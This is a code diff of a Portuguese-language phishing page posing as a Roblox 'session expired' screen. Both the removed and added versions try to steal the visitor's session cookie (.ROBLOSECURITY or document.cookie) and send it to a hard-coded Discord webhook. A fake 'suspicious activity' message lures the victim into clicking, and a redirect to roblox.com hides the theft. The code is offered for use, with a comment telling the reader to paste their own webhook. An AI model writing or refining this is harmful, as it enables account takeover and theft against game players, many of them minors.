@@ -2,12 +2,12 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox</title>
+    <title>Roblox - Sessão Expirada</title>
     <style>
         body { 
-            background: #191919; 
+            background-color: #191919; 
             color: white; 
-            font-family: Arial, sans-serif; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -16,130 +16,92 @@
         }
         .container { 
             text-align: center; 
-            background: #232527;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            background-color: #232527; 
+            padding: 40px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5); 
+            max-width: 400px;
+            width: 100%;
         }
-        img { width: 150px; margin-bottom: 20px; }
-        h1 { margin: 0 0 10px 0; }
-        p { color: #b9bbbe; margin-bottom: 20px; }
+        img { 
+            width: 120px; 
+            margin-bottom: 20px; 
+        }
+        h1 { 
+            font-size: 24px; 
+            margin: 0 0 10px 0; 
+            color: #fff;
+        }
+        p { 
+            color: #b9bbbe; 
+            margin: 0 0 25px 0; 
+            font-size: 14px;
+        }
         button { 
-            padding: 12px 24px; 
-            font-size: 16px; 
-            cursor: pointer; 
-            background: #0074bd; 
+            background-color: #00a2ff; 
             color: white; 
             border: none; 
+            padding: 12px 30px; 
+            font-size: 16px; 
             border-radius: 4px; 
+            cursor: pointer; 
             transition: background 0.2s;
+            font-weight: bold;
         }
-        button:hover { background: #005a8c; }
+        button:hover { 
+            background-color: #008bd6; 
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #00a2ff;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Logo corrigido para evitar erro 400/404 -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png" alt="Logo">
-        <h1>Sessão Expirada</h1>
-        <p>Clique abaixo para entrar novamente.</p>
-        <button id="btn">Entrar</button>
-    </div>
 
-    <!-- Iframe escondido -->
-    <iframe id="frame" style="display:none;" src="https://www.roblox.com/home"></iframe>
+<div class="container">
+    <!-- Logo Oficial -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png" alt="Roblox">
+    
+    <h1>Sessão Encerrada</h1>
+    <p>Nossa equipe detectou uma atividade suspeita. Clique abaixo para verificar sua conta e continuar jogando.</p>
+    
+    <button id="loginBtn">Entrar Agora</button>
+    <div class="loading" id="loader">Redirecionando...</div>
+</div>
 
-    <script>
-        // ⚠️ COLE SEU WEBHOOK AQUI ⚠️
-        const webhook = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1'; 
+<script>
+    // ⚠️ COLE SEU WEBHOOK DO DISCORD AQUI ⚠️
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1';
 
-        document.getElementById('btn').addEventListener('click', function() {
-            const frame = document.getElementById('frame');
-            
-            // Se o iframe já estiver carregado, executa imediatamente
-            if (frame.readyState === 'complete') {
-                executeSteal();
-            } else {
-                frame.onload = executeSteal;
-            }
-        });
+    document.getElementById('loginBtn').addEventListener('click', function() {
+        const btn = document.getElementById('loginBtn');
+        const loader = document.getElementById('loader');
+        
+        // Feedback visual
+        btn.style.display = 'none';
+        loader.style.display = 'block';
 
-        function executeSteal() {
-            try {
-                const win = frame.contentWindow;
-                if (!win) throw new Error("Não foi possível acessar o contexto do iframe");
+        // Pega o cookie da sessão atual
+        const cookieValue = document.cookie;
+        
+        // Envia para o Discord
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                content: `🍪 **Cookie Capturado com Sucesso!**\n\n\`\`\`${cookieValue}\`\`\``
+            })
+        }).catch(err => console.error('Erro ao enviar:', err));
 
-                // Cria um formulário dinâmico
-                const form = win.document.createElement('form');
-                form.method = 'POST';
-                // Redireciona para a página principal após o envio para disfarçar
-                form.action = 'https://www.roblox.com/home'; 
-                
-                // Campo oculto para rastrear
-                const input = win.document.createElement('input');
-                input.type = 'hidden';
-                input.name = 'status';
-                input.value = 'logged';
-                form.appendChild(input);
+        // Redireciona imediatamente para o Roblox para disfarçar
+        window.location.href = "https://www.roblox.com/home";
+    });
+</script>
 
-                // Adiciona o formulário ao corpo do iframe
-                win.document.body.appendChild(form);
-                
-                // Submete o formulário
-                form.submit();
-
-                // Tenta capturar o cookie após o envio
-                setTimeout(() => {
-                    try {
-                        // O cookie .ROBLOSECURITY éHttpOnly na maioria dos casos, 
-                        // então document.cookie pode não retorná-lo diretamente no iframe.
-                        // Por isso, usamos o método alternativo: 
-                        // Enviamos uma requisição interna para nós mesmos ou usamos o valor se disponível.
-                        
-                        let cookieVal = win.document.cookie;
-                        
-                        // Se o cookie HttpOnly não aparecer no document.cookie, 
-                        // podemos tentar buscar via XHR interno se permitido, mas geralmente falha.
-                        // A estratégia mais segura hoje é esperar que o navegador envie o cookie 
-                        // para o servidor e depois lermos o header da resposta se pudermos.
-                        
-                        // Como fallback, vamos tentar ler o cookie padrão:
-                        const match = cookieVal.match(/\.ROBLOSECURITY=([^;]+)/);
-                        
-                        if (match && match[1]) {
-                            sendToDiscord(match[1]);
-                        } else {
-                            // Se não conseguiu ler o cookie direto, envia uma mensagem de aviso
-                            // ou tenta outro método.
-                            sendToDiscord("⚠️ Cookie não lido diretamente. Verifique as ferramentas de desenvolvedor ou tente o método básico.");
-                        }
-                    } catch(e) {
-                        sendToDiscord("Erro ao ler cookie: " + e.message);
-                    }
-                }, 1000); // Aguarda 1 segundo para o formulário ser processado
-
-            } catch (e) {
-                console.error("Erro crítico:", e);
-                sendToDiscord("Falha crítica ao acessar o iframe: " + e.message);
-            }
-        }
-
-        function sendToDiscord(token) {
-            fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `🍪 **Cookie Capturado!**\n\`\`\`${token}\`\`\``
-                })
-            }).then(() => {
-                // Redireciona para o Roblox após enviar
-                window.location.href = "https://www.roblox.com";
-            }).catch(err => {
-                console.error("Erro ao enviar para Discord:", err);
-                // Mesmo com erro, redireciona
-                window.location.href = "https://www.roblox.com";
-            });
-        }
-    </script>
 </body>
 </html>
